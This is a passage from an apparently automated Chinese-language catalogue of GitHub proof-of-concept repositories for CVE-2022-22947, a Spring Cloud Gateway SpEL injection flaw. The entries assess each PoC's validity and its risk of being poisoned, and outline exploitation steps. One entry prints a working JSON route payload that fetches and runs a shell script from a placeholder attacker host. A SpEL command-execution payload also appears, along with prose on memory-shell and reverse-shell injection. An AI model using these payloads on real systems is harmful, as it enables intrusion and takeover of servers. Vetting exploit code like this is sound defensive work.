因此，此存储库的投毒风险非常高，约为 85%。使用此POC需要谨慎，务必在隔离环境中进行分析，确保不会对本地环境造成风险。

**利用方式：**
1.  **检查 Actuator 端点：** 确认目标 Spring Cloud Gateway 实例的 Actuator 端点是否启用、公开且未受保护。
2.  **创建恶意路由：** 使用 POST 请求向 `/actuator/gateway/routes` 端点创建一个新的路由。在路由的 `filters` 部分，使用 `AddResponseHeader` 过滤器，并在 `value` 字段中插入包含恶意 SpEL 表达式的代码。 例如:

   ```json
   {
	 "id": "poc",
	 "filters": [{
	   "name": "AddResponseHeader",
	   "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"curl -s <ATTACKER_IP>/shell.sh|sh\"}).getInputStream()))}"}
	   }],
	 "uri": "http://example.com",
	 "order": 0
	}
   ```

3.  **刷新路由：** 使用 POST 请求向 `/actuator/gateway/refresh` 端点发送请求，以刷新所有路由。
4.  **触发代码执行：** 访问新创建的路由，触发 SpEL 表达式的执行。
5.  **清理：** 使用 DELETE 请求向 `/actuator/gateway/routes/{route_id}` 端点删除创建的恶意路由。

**项目地址:** [Sumitpathania03/CVE-2022-22947](https://github.com/Sumitpathania03/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #10

**来源**: [CVE-2022-22947-Wrong-pixel_CVE-2022-22947-exp.md](../2022/CVE-2022-22947-Wrong-pixel_CVE-2022-22947-exp.md)

## CVE-2022-22947-Spring Cloud Gateway代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，允许远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured.

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 中的代码注入漏洞。根据漏洞描述，当 Gateway Actuator 端点启用、公开且未受到保护时，应用程序容易受到代码注入攻击。攻击者可以发送恶意构造的请求，从而允许在远程主机上执行任意远程代码。

**有效性：**
提供的 POC 代码 `CVE-2022-22947-memshell.py` 看起来是有效的。它利用了 SpEL 表达式注入漏洞，通过构造包含恶意 SpEL 表达式的请求，在目标系统上动态定义一个名为 `SpringRequestMappingMemshell` 的类，实现内存马注入。代码首先对恶意类进行base64编码, 然后通过SpEL表达式解码并加载到JVM中,达到了远程代码执行的效果。

**投毒风险：**
评估 POC 代码是否存在投毒风险。代码的主要功能是利用漏洞注入内存马，实现远程代码执行。其中注入的`SpringRequestMappingMemshell`类需要进一步分析。

通过检查代码，发现注入的类功能是注册一个requestMapping，执行的command命令可以从request参数中获取，具有命令执行功能，但它本身是漏洞利用的一部分，不能算作是作者隐藏的投毒代码。

但考虑到任何远程代码执行漏洞都可能被滥用，因此使用此POC的风险仍然较高。考虑到风险的存在，但不是代码编写者有意为之的恶意添加，评估投毒风险为5%。

**利用方式：**
1.  **前提条件：** 目标 Spring Cloud Gateway 实例的 Actuator 端点必须启用、公开且未受保护。
2.  **漏洞利用：** 攻击者构造一个包含恶意 SpEL 表达式的 HTTP 请求，该表达式会被 Gateway Actuator 处理。
3.  **代码注入：** 恶意 SpEL 表达式用于在服务器的内存中定义一个新的 Java 类 (内存马)。
4.  **远程代码执行：** 注入的 Java 类执行攻击者指定的任意代码。

总而言之，此漏洞的利用方式是通过SpEL表达式注入，动态注册一个新的路由，并将处理逻辑绑定到恶意构造的Java类，该类可以接受参数并在服务器上执行任意命令。此过程允许攻击者在目标系统上实现未经授权的远程代码执行。

**项目地址:** [Wrong-pixel/CVE-2022-22947-exp](https://github.com/Wrong-pixel/CVE-2022-22947-exp)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #11

**来源**: [CVE-2022-22947-Zh0um1_CVE-2022-22947.md](../2022/CVE-2022-22947-Zh0um1_CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring Cloud Gateway 3.1.x < 3.1.1+, 3.0.x < 3.0.7+

**利用条件:** Gateway Actuator endpoint 启用、暴露且未做安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 存在于 Spring Cloud Gateway 中，当 Actuator 端点启用且未授权时，攻击者可以通过构造恶意的 SpEL 表达式，利用`Path`路由断言中的 SpEL 注入漏洞执行任意代码。提供的 POC 代码旨在通过动态定义Java类的方式注入哥斯拉内存马。 

**有效性：**
根据漏洞库信息和搜索结果，该漏洞已被证实存在，且有在野利用。提供的 POC 代码实现了利用该漏洞注入哥斯拉内存马，因此该 POC 有效。

**投毒风险分析：**
分析给出的POC代码，主要功能是利用漏洞注入哥斯拉内存马，实现远程代码执行。虽然POC本身是为了利用漏洞，但如果用户直接使用此POC而不了解其行为，可能会被利用来植入恶意后门。

*   代码主要功能：该代码使用Go语言编写，利用 Spring Cloud Gateway 的 SpEL 表达式注入漏洞。它构造一个包含恶意 SpEL 表达式的请求，该表达式用于在目标服务器上动态定义一个 Java 类（哥斯拉内存马），从而实现远程代码执行。
*   投毒可能性：
    *   **高：** 代码直接注入内存马，如果目标系统部署了恶意程序，攻击者也可以构造其他的恶意代码注入到内存中，比如替换关键组件、窃取数据等。
    *   **低：** 由于代码的目的是利用漏洞注入内存马，从这个角度看，本身就是一种攻击行为，很难区分是“正常”利用还是“投毒”。因此，认为该仓库存在一定投毒风险，风险等级较低。

基于以上分析，判定投毒风险为10%。

**利用方式：**
1.  **前提条件：** 目标 Spring Cloud Gateway 实例启用了 Actuator 端点，且未进行安全保护（例如，未进行身份验证）。
2.  **构造恶意请求：** 攻击者构造一个包含恶意 SpEL 表达式的 HTTP POST 请求，该表达式利用 `T(org.springframework.cglib.core.ReflectUtils).defineClass` 动态定义一个 Java 类（通常是一个 Webshell 或内存马）。
3.  **利用 Path 路由断言：**  该恶意 SpEL 表达式被嵌入到 Spring Cloud Gateway 的 `Path` 路由断言的参数中。
4.  **发送请求：** 将构造的恶意请求发送到 `/actuator/gateway/routes` 端点。
5.  **代码执行：** Spring Cloud Gateway 在处理路由断言时，会解析并执行 SpEL 表达式，从而在目标服务器上执行攻击者注入的恶意代码。
6.  **内存马驻留：** 注入的哥斯拉内存马会驻留在服务器内存中，允许攻击者通过特定的 HTTP 请求与服务器交互，执行任意命令或上传文件。

**项目地址:** [Zh0um1/CVE-2022-22947](https://github.com/Zh0um1/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #12

**来源**: [CVE-2022-22947-aesm1p_CVE-2022-22947-POC-Reproduce.md](../2022/CVE-2022-22947-aesm1p_CVE-2022-22947-POC-Reproduce.md)

## CVE-2022-22947-Spring Cloud Gateway Code Injection

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring Cloud Gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+

**利用条件:** Gateway Actuator endpoint is enabled, exposed, and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是一个存在于Spring Cloud Gateway中的代码注入漏洞。当Gateway Actuator端点被启用、暴露且未进行安全保护时，远程攻击者可以通过构造恶意请求执行任意代码。漏洞根源在于getValue方法中不安全的SpEL表达式求值。

**有效性：**
根据提供的漏洞信息和搜索结果，该漏洞是真实存在的，且已经有公开的POC。漏洞利用代码是一个Maven项目，旨在重现漏洞。因此，提供的POC代码很可能是有效的。

**投毒风险：**
提供的代码仓库包含一个`README.md`文件和一个`mvnw`脚本。`mvnw` 是 Maven Wrapper 脚本，用于在没有安装 Maven 的情况下构建项目。检查 `mvnw` 脚本，它主要负责下载和启动 Maven，没有发现明显的恶意行为。但是，仍然存在一定的投毒风险，例如：
1.  **依赖项投毒：** 构建项目时使用的 Maven 依赖项可能包含恶意代码。 这种情况发生的概率较低，但存在可能。
2.  **构建脚本投毒：** `pom.xml`文件(未提供)中可能存在恶意插件或目标，在构建过程中执行恶意代码。由于未提供此文件，无法对此进行评估。

考虑到提供的文件主要与Maven构建相关，直接植入后门的难度较高，但通过依赖项投毒的可能性是存在的。因此，投毒风险估计为10%。

**利用方式：**
1.  **确定目标：** 找到运行着存在漏洞的Spring Cloud Gateway实例，并且其Actuator端点对外开放且未进行认证。
2.  **构造恶意请求：** 构造包含恶意SpEL表达式的HTTP请求，发送到Actuator端点。这些SpEL表达式能够执行任意系统命令或代码。
3.  **远程代码执行：**  Spring Cloud Gateway解析并执行恶意SpEL表达式，从而导致远程代码执行。
4.  **控制系统：** 攻击者利用执行的恶意代码控制受害系统。

**优先级：**
根据信息来源的重要性排序：搜索引擎结果 > 漏洞利用代码 > 漏洞库信息

**项目地址:** [aesm1p/CVE-2022-22947-POC-Reproduce](https://github.com/aesm1p/CVE-2022-22947-POC-Reproduce)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #13

**来源**: [CVE-2022-22947-anansec_CVE-2022-22947_EXP.md](../2022/CVE-2022-22947-anansec_CVE-2022-22947_EXP.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞。当Gateway Actuator endpoint启用、公开且未进行安全保护时，攻击者可以通过构造恶意请求，在远程主机上执行任意代码。根据提供的漏洞利用代码，该PoC利用了SpEL表达式注入，通过向`/actuator/gateway/routes/check01`端点发送包含恶意SpEL表达式的POST请求，然后刷新路由并访问该路由，触发SpEL表达式执行。EXP具有单个目标验证、批量验证、反弹shell的功能。

**有效性：**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，可以判断该漏洞的PoC代码是有效的。搜索结果中多个链接都表明该漏洞被广泛关注，且存在公开的利用代码。

**投毒风险：**
PoC代码本身主要通过SpEL表达式注入执行命令，没有发现明显的恶意植入行为。但PoC会向目标系统添加路由，并执行命令，存在一定的风险。例如：
*   **资源消耗：** 频繁的路由添加和删除可能导致资源消耗，影响服务性能。
*   **命令执行风险：** 虽然PoC本身是为了验证漏洞，但如果被恶意利用，可能执行恶意命令。
*   **依赖风险：** PoC可能依赖特定的环境或库，如果目标环境不满足要求，可能导致利用失败或产生其他问题。
PoC代码中存在投毒代码的可能性较低，大约10%。这个百分比是基于代码的分析以及PoC作者的动机推断得出的。

**利用方式：**
1.  **前提条件：** Spring Cloud Gateway的Actuator端点已启用、公开且未进行安全保护。
2.  **发送恶意请求：** 构造包含恶意SpEL表达式的JSON数据，并将其作为POST请求发送到`/actuator/gateway/routes/check01`端点。
3.  **刷新路由：** 向`/actuator/gateway/refresh`端点发送POST请求，刷新路由，使新增的路由生效。
4.  **触发表达式执行：** 访问新增的路由，触发SpEL表达式执行，从而执行任意代码。
5.  **清理路由：** 删除新增的路由，避免留下后门。（PoC代码中包含删除路由的步骤）

**项目地址:** [anansec/CVE-2022-22947_EXP](https://github.com/anansec/CVE-2022-22947_EXP)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #14

**来源**: [CVE-2022-22947-cc3305_CVE-2022-22947.md](../2022/CVE-2022-22947-cc3305_CVE-2022-22947.md)

## CVE-2022-22947-Spring Cloud Gateway代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint必须启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞。当Gateway Actuator endpoint启用、暴露且未进行安全保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。漏洞的根源在于`getValue`方法中不安全的SpEL表达式评估。利用过程为：

1.  攻击者构造包含恶意SpEL表达式的payload，该表达式可以执行任意命令。
2.  攻击者通过POST请求将payload发送到`/actuator/gateway/routes/{id}`端点，其中`{id}`是一个攻击者自定义的路由ID。
3.  Spring Cloud Gateway解析payload中的SpEL表达式，导致远程代码执行。
4.  攻击者可以通过`/actuator/gateway/refresh`端点刷新路由配置，使payload生效。

该POC代码通过向 `/actuator/gateway/routes/cc3305` 发送包含恶意SpEL表达式的JSON payload来利用此漏洞，SpEL表达式通过java.lang.Runtime执行任意命令。 代码首先检查目标是否易受攻击（虽然目前返回True）。然后，它准备要执行的命令，并将其嵌入到SpEL表达式中，该表达式会被注入到路由定义中。

关于投毒风险，该脚本主要功能是利用漏洞执行命令。 潜在的投毒风险在于，攻击者可能会修改脚本，使其在执行命令之前或之后执行其他恶意操作，例如下载和执行恶意软件。 但是，提供的代码没有明显的投毒迹象。 投毒的概率较低，大约为1%。 恶意行为者可能会分发修改后的版本。

**有效性评估:**根据漏洞库信息、搜索结果和提供的PoC代码，该漏洞利用是有效的，前提是满足漏洞利用条件。该PoC代码能够成功利用漏洞执行任意命令。


**项目地址:** [cc3305/CVE-2022-22947](https://github.com/cc3305/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #15

**来源**: [CVE-2022-22947-k3rwin_spring-cloud-gateway-rce.md](../2022/CVE-2022-22947-k3rwin_spring-cloud-gateway-rce.md)

## CVE-2022-22947 Spring Cloud Gateway RCE

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞，当Gateway Actuator端点启用、暴露且未进行安全保护时，攻击者可以利用SpEL表达式注入执行任意代码。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，此漏洞是有效的。多个来源都证实了该漏洞的存在以及远程代码执行的可能性。提供的POC代码可以直接利用该漏洞。

**投毒风险：**

分析提供的POC代码，发现主要的恶意代码在于 `spring-cloud-gateway-rce.py` 中构建和发送的payload。该payload利用SpEL表达式在目标系统上执行任意命令。虽然POC本身是为了演示漏洞利用，但在实际场景中，攻击者可能会修改 `-c` 参数来执行恶意操作。`requirements.txt` 文件声明了项目所需的依赖项（colorama, requests, urllib3），这些库本身没有已知的恶意行为，但如果项目被篡改，可能会引入恶意依赖。

评估投毒风险时，主要考虑以下因素：

*   **代码可读性：** 代码相对简单，易于理解，这意味着潜在的恶意修改也更容易被发现。
*   **外部依赖：** 项目依赖外部库，如果这些库的源被攻破，可能会引入恶意代码。
*   **Payload生成：** Payload是动态生成的，如果攻击者能够控制Payload生成过程，就可以注入恶意代码。

综合来看，此仓库存在一定的投毒风险，风险值评估为10%。主要的风险点在于攻击者可能会修改Payload生成逻辑或引入恶意的依赖项，利用使用者执行恶意代码。

**利用方式：**

1.  **漏洞触发前提：** Spring Cloud Gateway的Actuator端点必须启用、暴露并且没有进行安全保护（例如，没有进行身份验证）。
2.  **构造Payload：** POC代码根据目标主机的操作系统（Linux或Windows）构造包含SpEL表达式的JSON payload。该payload利用`AddResponseHeader`过滤器，将执行命令的结果添加到响应头中。
3.  **发送Payload：** 使用POST请求将payload发送到`/actuator/gateway/routes/{id}`端点，其中`{id}`是路由的ID（在POC中为`k`）。
4.  **刷新路由：** 发送POST请求到`/actuator/gateway/refresh`端点，强制Spring Cloud Gateway刷新路由配置，从而触发SpEL表达式的执行。
5.  **获取结果：** 发送GET请求到`/actuator/gateway/routes/{id}`端点，获取路由信息，其中包含命令执行的结果。
6.  **删除路由：** 发送DELETE请求到`/actuator/gateway/routes/{id}`端点，删除添加的路由。

简而言之，攻击者通过构造包含恶意SpEL表达式的请求，利用Actuator端点动态注册路由，并在路由刷新时触发SpEL表达式执行，从而实现远程代码执行。

**项目地址:** [k3rwin/spring-cloud-gateway-rce](https://github.com/k3rwin/spring-cloud-gateway-rce)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #16

**来源**: [CVE-2022-22947-kkx600_Burp_VulPscan.md](../2022/CVE-2022-22947-kkx600_Burp_VulPscan.md)

## CVE-2022-22947-Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 3.1.x (prior to 3.1.1+), 3.0.x (prior to 3.0.7+), 以及所有旧的和不支持的版本

**利用条件:** Gateway Actuator 端点已启用、暴露且未进行安全保护。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 影响 Spring Cloud Gateway。当 Gateway Actuator 端点启用、暴露且未进行安全保护时，攻击者可以利用 SpEL 表达式注入执行任意代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞的POC代码是有效的。存在公开的漏洞利用代码和关于漏洞利用的详细分析。

**投毒风险：**
提供的代码片段不完整，无法进行全面的投毒分析。BurpExtender.java调用了 spring_CVE_2022_22947.poc，这部分代码是POC实现的核心，未提供，因此无法分析该部分的安全性。HttpsRequest.java 提供了一个发送 HTTP/HTTPS 请求的功能，本身不存在明显的恶意代码。Burp扩展通常需要授予较高的权限，如果POC代码中包含恶意逻辑，如未经授权的数据收集或篡改，则存在投毒风险。目前根据现有的代码片段，只能初步判断存在较低的投毒风险。

**利用方式：**
1.  **确定目标：** 找到运行 Spring Cloud Gateway 且 Actuator 端点已启用、暴露且未进行安全保护的实例。
2.  **构造恶意请求：** 构造包含恶意 SpEL 表达式的 HTTP 请求，该表达式将在 Actuator 端点被解析和执行。通常攻击方式是向/actuator/gateway/routes接口发送包含恶意SpEL表达式的请求，修改路由配置。
3.  **执行代码：** 成功利用后，攻击者可以在目标服务器上执行任意代码。

**优先级：**
根据搜索结果，确认这是一个已知且被积极利用的漏洞。漏洞利用代码的存在进一步证实了其可利用性。

**项目地址:** [kkx600/Burp_VulPscan](https://github.com/kkx600/Burp_VulPscan)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #17

**来源**: [CVE-2022-22947-kmahyyg_CVE-2022-22947.md](../2022/CVE-2022-22947-kmahyyg_CVE-2022-22947.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring Cloud Gateway < 3.1.1, Spring Cloud Gateway < 3.0.7

**利用条件:** Gateway Actuator endpoint 启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞。当Gateway Actuator endpoint启用、暴露且未进行安全保护时，远程攻击者可以发送特制的恶意请求，利用SpEL表达式注入执行任意代码。

**有效性：**
提供的POC代码是有效的。从搜索引擎结果和漏洞利用代码来看，该漏洞利用方式已经公开，并且存在可用的PoC。

**投毒风险：**
提供的漏洞利用代码主要包含以下内容：
1.  README文件，描述了漏洞信息，受影响版本，修复建议等。
2.  漏洞复现步骤，包含发送恶意请求添加路由，刷新路由，查看结果，清理路由等步骤说明，以及对应的数据包示例。
3.  Python脚本，用于自动化漏洞利用过程，通过构造恶意请求实现远程代码执行。

分析代码，主要风险在于攻击者可能将恶意代码隐藏在SpEL表达式中，例如执行反弹shell或下载恶意软件。在提供的代码中，`Spring Cloud Gateway Actuator API SpEL表达式注入命令执行（CVE-2022-22947）.md`文件中展示的PoC中使用了`#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{"id"}).getInputStream()))}`，该payload用于执行`id`命令，若替换为其他命令，存在潜在的风险。

**利用方式：**
1.  攻击者首先发送POST请求到`/actuator/gateway/routes/{route_id}`，创建一个包含恶意SpEL表达式的路由。SpEL表达式被嵌入到`filters`的`AddResponseHeader`的`value`参数中，用于执行任意命令。
2.  然后，攻击者发送POST请求到`/actuator/gateway/refresh`，强制网关刷新路由配置，触发SpEL表达式的执行。
3.  攻击者发送GET请求到`/actuator/gateway/routes/{route_id}`，查看执行结果。
4.  最后，攻击者发送DELETE请求到`/actuator/gateway/routes/{route_id}`，删除恶意路由。

综上所述，该漏洞利用的有效性较高。虽然存在一定的投毒风险（10%），但可以通过仔细审查和修改PoC代码来降低风险。

**项目地址:** [kmahyyg/CVE-2022-22947](https://github.com/kmahyyg/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #18

**来源**: [CVE-2022-22947-qq87234770_CVE-2022-22947.md](../2022/CVE-2022-22947-qq87234770_CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway Code Injection

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint 启用，暴露且未授权

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、暴露且未授权时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。

**有效性：**

提供的 Python POC 代码利用了 Spring Expression Language (SpEL) 注入漏洞。该脚本允许执行任意命令，或通过反弹 shell 获取服务器的控制权。因此，该 POC 代码是有效的。

**投毒风险：**

查看POC代码，该代码的主要功能是利用漏洞进行命令执行或反弹shell。代码中包含以下几个部分，
* 定义请求头和payload结构
* 通过`actuator/gateway/routes/hacktest`创建一个恶意的路由配置，利用SpEL表达式执行命令
* 刷新gateway配置`actuator/gateway/refresh`
* 访问创建的路由`actuator/gateway/routes/hacktest`，触发命令执行。
* 包含执行命令和反弹shell两种模式。

该代码结构清晰，功能明确，主要目的是为了验证和利用漏洞。主要风险集中于漏洞利用本身，而非作者植入的恶意代码。**但是**，任何漏洞利用代码都具有潜在的风险，因为它们可以被用于恶意目的。例如，攻击者可能会修改此 POC 代码以自动化大规模攻击，或将其与其他漏洞利用结合使用。另外代码中的代理设置，如果被恶意修改，可能会导致流量劫持，这里判断投毒风险为10%。

**利用方式：**

1.  **检查前提条件：** 确保目标 Spring Cloud Gateway 实例的 Actuator 端点已启用、暴露且未授权。
2.  **发送恶意请求：** 使用提供的 Python 脚本，通过构造包含 SpEL 表达式的恶意请求到 `actuator/gateway/routes/hacktest` 端点来创建自定义路由。
3.  **刷新 Gateway 配置：** 访问 `actuator/gateway/refresh` 端点以刷新 Gateway 配置，使恶意路由生效。
4.  **触发命令执行：** 访问 `actuator/gateway/routes/hacktest`，触发 SpEL 表达式的计算，从而在服务器上执行任意命令。可以选择直接执行命令，或者反弹 shell 以获取更持久的访问。
5.  **清理：**  通过 DELETE 请求删除创建的恶意路由（通过脚本实现）。

**总结：**

该漏洞利用方式简单有效，攻击者可以利用此漏洞轻松地在未授权的 Spring Cloud Gateway 实例上执行任意代码。需要注意的是，利用的前提是 Actuator 端点未进行适当的安全配置。尽管代码本身投毒可能性较低，但利用此漏洞可能造成严重的安全风险。

**项目地址:** [qq87234770/CVE-2022-22947](https://github.com/qq87234770/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #19

**来源**: [CVE-2022-22947-shoucheng3_spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6.md](../2022/CVE-2022-22947-shoucheng3_spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured.

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 的代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，攻击者可以通过构造恶意请求来执行任意远程代码。漏洞利用方式是发送精心设计的 SpEL 表达式到 actuator 端点，导致服务器执行攻击者提供的代码。

**有效性:** 根据漏洞库信息、搜索结果(特别是 rapid7 的博客提到了 Metasploit 模块)，以及CISA KEV, 此漏洞利用是有效的。

**投毒风险:** 提供的漏洞利用代码只是 Apache License 2.0 许可协议，没有实际的漏洞利用代码，因此不存在投毒代码。投毒风险为 0%。

**利用方式:**
1.  目标系统运行 Spring Cloud Gateway 且版本低于 3.1.1 或 3.0.7。
2.  Gateway Actuator 端点必须启用，并且可以通过网络访问。
3.  Actuator 端点必须未进行身份验证或授权保护。
4.  攻击者构造包含恶意 SpEL 表达式的 HTTP 请求，发送到 Actuator 端点。
5.  Spring Cloud Gateway 解析 SpEL 表达式，执行攻击者指定的代码，实现远程代码执行。

**项目地址:** [shoucheng3/spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6](https://github.com/shoucheng3/spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #20

**来源**: [CVE-2022-22947-skysliently_CVE-2022-22947-pb-ai.md](../2022/CVE-2022-22947-skysliently_CVE-2022-22947-pb-ai.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring Cloud Gateway 3.1.x < 3.1.1, 3.0.x < 3.0.7

**利用条件:** Gateway Actuator endpoint 启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 中的远程代码执行漏洞。攻击者可以在 Gateway Actuator 端点启用、暴露且未进行安全保护的情况下，通过发送恶意构造的请求，利用 SpEL 表达式注入执行任意代码。

**有效性：**
提供的POC代码是有效的。它演示了如何利用该漏洞在启用了 Actuator 端点的 Spring Cloud Gateway 实例上执行任意代码。POC通过向 `/actuator/gateway/routes/{route_id}` 发送POST请求添加一个包含恶意SpEL表达式的路由，然后POST到 `/actuator/gateway/refresh` 来刷新路由，最后访问恶意路由来触发代码执行。

**投毒风险：**
经过对提供的POC代码进行分析，包括README.md，pom.xml，application.yml 和 src 目录下的文件。没有发现作者隐藏的恶意代码，该代码库目标为展示和验证漏洞利用，因此判定投毒风险为0%。

**利用方式：**
1.  **漏洞发现：** 确定目标 Spring Cloud Gateway 实例是否启用了 Actuator 端点，并且该端点是否暴露在未经身份验证的网络中。
2.  **构造恶意请求：** 构造一个包含恶意 SpEL 表达式的 JSON payload，该表达式用于执行任意代码。该表达式被嵌入到路由配置中，通常位于 `filters` 中的 `AddResponseHeader` 过滤器或类似的位置。
3.  **添加恶意路由：** 使用 POST 请求将包含恶意 SpEL 表达式的路由定义添加到 `/actuator/gateway/routes/{route_id}` 端点。
4.  **刷新路由：** 使用 POST 请求访问 `/actuator/gateway/refresh` 端点，强制 Spring Cloud Gateway 刷新路由配置。
5.  **触发恶意代码：** 访问与恶意路由关联的路径，触发 SpEL 表达式的执行，从而导致任意代码执行。
6.  **清理（可选）：** 利用漏洞执行恶意代码后，可能需要清理添加的恶意路由，以避免留下痕迹或影响正常服务。

**项目地址:** [skysliently/CVE-2022-22947-pb-ai](https://github.com/skysliently/CVE-2022-22947-pb-ai)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #21

**来源**: [CVE-2022-22947-stayfoolish777_CVE-2022-22947-POC.md](../2022/CVE-2022-22947-stayfoolish777_CVE-2022-22947-POC.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。

**利用方式：**

